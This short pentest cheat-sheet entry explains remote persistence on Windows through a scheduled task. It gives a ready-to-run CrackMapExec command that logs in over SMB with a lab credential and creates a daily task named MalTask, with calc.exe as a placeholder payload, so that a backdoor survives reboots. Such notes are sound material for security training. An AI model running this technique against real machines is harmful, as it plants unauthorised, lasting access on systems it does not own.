## Attack: Create scheduled task on remote machine for persistence.
### How it Works:

- Authenticate to target remotely
- Use schtasks command to create task
- Task runs at specified time or interval
- Maintains access even after reboot

### Tool: CrackMapExec + schtasks
```bash
crackmapexec smb 192.168.57.101 -u user1 -p Password123! -x "schtasks /create /tn MalTask /tr calc.exe /sc daily /st 12:00 /f" --exec-method smbexec
``` 
**Goal**: Establish persistence, ensure backdoor survives reboots    
